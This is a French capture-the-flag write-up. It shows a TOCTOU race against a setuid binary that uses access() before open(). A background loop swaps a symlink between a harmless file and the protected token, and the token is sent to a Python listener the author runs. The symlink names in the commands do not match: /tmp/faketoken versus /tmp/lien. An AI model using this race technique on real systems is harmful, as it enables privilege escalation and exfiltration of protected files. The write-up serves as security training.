# Level10

Premiere étape de recherche

	$ ls -la
	-rwsr-sr-x+ 1 flag10  level10 10817 Mar  5  2016 level10
	-rw-------  1 flag10  flag10     26 Mar  5  2016 token

On trouve un binaire setuid et un fichier token sans droits pour nous

	$ ./level10
	./level10 file host
	sends file to host if you have access to it

Le programme envoi un fichier vers une adresse à première vue

	$ ./level10 token localhost
	You don't have access to token

On a pas les droits sur token? Ou alors c'est un check manuel dans le code pour "token"

	$ ./level10 .profile localhost
	Connecting to localhost:6969 .. Unable to connect to host localhost

Pas de problemes de droits avec un fichier appartenant à level10

Pour commencer on va faire un petit serveur en python pour récupérer ce qui est envoyé

```python
#! /usr/bin/python3

import socket
import sys

# On prépare la socket
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# Set et bind de l'adresse et du port
server_address = ("192.168.1.22", 6969)
sock.bind(server_address)
print("starting up on %s port %s" % server_address)
sock.listen(1)

# Boucle infinie pour écouter
while True:
	print("waiting for a connection")
	# Accepte les connections
	connection, client_address = sock.accept()
	print("connection from", client_address)
	# Boucle infinie pour récupérer les datas reçues
	while True:
		# Par blocs de 64
		data = connection.recv(64)
		print('received "%s"' % data)
		# Close quand c'est fini
		if len(data) < 1:
			connection.close()
			break
	break

```

On lance notre serveur de notre coté

	./server.py
	starting up on 192.168.1.22 port 6969
	waiting for a connection

Puis sur la machine on essaye d'envoyer un fichier simple

	$ echo "coucou" > /tmp/coucou

	$ ./level10 /tmp/coucou 192.168.1.22
	Connecting to 192.168.1.22:6969 .. Connected!
	Sending file .. wrote file!

On reçoit bien de notre coté même si c'est pas très propre, ça fera l'affaire

	./server.py
	starting up on 192.168.1.22 port 6969
	waiting for a connection
	connection from ('192.168.1.31', 42473)
	received "b'.*( )*.\n'"
	received "b'coucou\n'"
	received "b''"

Pour les droits du fichier token, faire un lien ne fonctionne pas, donc c'est pas un check sur le nom, c'est bien un problème de droits

On va devoir chercher un peu plus avec GDB

	$ gdb level10
	$ (gdb) disas main
	...
	0x08048749 <+117>:	call   0x80485e0 <access@plt>
	...
	0x0804889b <+455>:	call   0x80485a0 <open@plt>
	...

On voit un appel à access très tot (surement pour checker les droits du fichier à ouvrir) et le open est fait bien plus loin, après l'ouverture de la socket

Un `man access` nous donne les infos suivantes :

> Avertissement : Utiliser access() pour vérifier si un utilisateur a le droit, par exemple, d'ouvrir un fichier avant d'effectuer réellement l'ouverture avec open(2),risque de créer un trou de sécurité. En effet, l'utilisateur peut exploiter le petit intervalle de temps entre la vérification et l'accès pour modifier le fichier (via un lien symbolique en général). Pour cette raison, l'utilisation de cet appel système devrait être évitée.

C'est exactement ce qu'on va faire. Il faut que le `access` soit fait sur un fichier avec les bons droits et le open sur le vrai fichier token

On va créer un fichier tout simple avec les bons droits

	$ echo coucou > /tmp/coucou

Ensuite il nous faudra un fichier /tmp/faketoken qui va etre un lien un coup vers token pour le lire, un coup vers "/tmp/coucou" pour passer les droits. Tout ça très vite pour faire une race condition

On va donc utiliser une boucle infinie de création de ces liens

En background pour pouvoir continuer a utiliser le shell

	$ $(while true; do ln -sf /tmp/coucou /tmp/faketoken; ln -sf $(pwd)/token /tmp/faketoken; done)&

On lance le serveur de notre côté et sur la vm on envoi le fichier, plusieurs fois pour bien tomber

	$ ./server.py
	starting up on 192.168.1.22 port 6969
	waiting for a connection
	connection from ('192.168.1.27', 53723)
	received "b'.*( )*.\n'"
	received "b'XXXXXXXXXXXXXXXXXXXX\n'"
	received "b''"

	$ ./level10 /tmp/lien 192.168.1.22
	You don't have access to /tmp/lien
	$ ./level10 /tmp/lien 192.168.1.22
	You don't have access to /tmp/lien
	$ ./level10 /tmp/lien 192.168.1.22
	Connecting to 192.168.1.22:6969 .. Connected!
	Sending file .. wrote file!
